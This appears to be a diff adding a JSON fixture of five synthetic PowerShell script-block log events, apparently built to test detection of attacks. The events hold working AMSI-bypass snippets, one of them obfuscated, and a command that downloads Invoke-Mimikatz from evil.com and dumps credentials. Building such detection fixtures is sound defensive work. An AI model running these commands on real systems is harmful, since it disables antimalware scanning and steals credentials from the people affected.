@@ -1,0 +1,57 @@
+[
+  {
+    "EventID": 4104,
+    "EventTime": "2026-06-18T11:00:00.000Z",
+    "ScriptBlockText": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)",
+    "ScriptBlockId": "11111111-1111-1111-1111-111111111111",
+    "Path": "C:\\Users\\attacker\\Desktop\\bypass.ps1",
+    "MachineName": "VICTIM-WORKSTATION",
+    "User": "DOMAIN\\victimuser",
+    "ProcessId": 4520,
+    "ThreadId": 1234
+  },
+  {
+    "EventID": 4104,
+    "EventTime": "2026-06-18T11:00:05.000Z",
+    "ScriptBlockText": "[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true; [System.Management.Automation.AmsiUtils]::amsiContext = $null",
+    "ScriptBlockId": "22222222-2222-2222-2222-222222222222",
+    "Path": "C:\\Temp\\script.ps1",
+    "MachineName": "VICTIM-WORKSTATION",
+    "User": "DOMAIN\\victimuser",
+    "ProcessId": 4520,
+    "ThreadId": 1235
+  },
+  {
+    "EventID": 4104,
+    "EventTime": "2026-06-18T11:00:10.000Z",
+    "ScriptBlockText": "$amsiDll = [System.Runtime.InteropServices.Marshal]::LoadLibrary('amsi.dll'); $amsiScanBuffer = [System.Runtime.InteropServices.Marshal]::GetProcAddress($amsiDll, 'AmsiScanBuffer'); [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 0xC3)",
+    "ScriptBlockId": "33333333-3333-3333-3333-333333333333",
+    "Path": "C:\\Windows\\Temp\\amsi_patch.ps1",
+    "MachineName": "VICTIM-SERVER",
+    "User": "DOMAIN\\admin",
+    "ProcessId": 5678,
+    "ThreadId": 5678
+  },
+  {
+    "EventID": 4104,
+    "EventTime": "2026-06-18T11:00:15.000Z",
+    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
+    "ScriptBlockId": "44444444-4444-4444-4444-444444444444",
+    "Path": "C:\\Users\\Public\\run.ps1",
+    "MachineName": "VICTIM-WORKSTATION",
+    "User": "DOMAIN\\victimuser",
+    "ProcessId": 6789,
+    "ThreadId": 4321
+  },
+  {
+    "EventID": 4104,
+    "EventTime": "2026-06-18T11:00:20.000Z",
+    "ScriptBlockText": "sET-vARiABLe aMsi ('A'+'M'+'S'+'I'); [Ref].ASsEmBlY.GetTyPe('SyStEm.MAnAGeMeNT.AUtOmAtIoN.'+$aMsi+'Utils').GetFieLD('aMsIiNiTfAiLeD','NonPuBliC,StAtIc').SeTValUe($NuLl,$TrUe)",
+    "ScriptBlockId": "55555555-5555-5555-5555-555555555555",
+    "Path": "C:\\PerfLogs\\obfuscated.ps1",
+    "MachineName": "VICTIM-WORKSTATION",
+    "User": "DOMAIN\\victimuser",
+    "ProcessId": 7890,
+    "ThreadId": 9876
+  }
+]
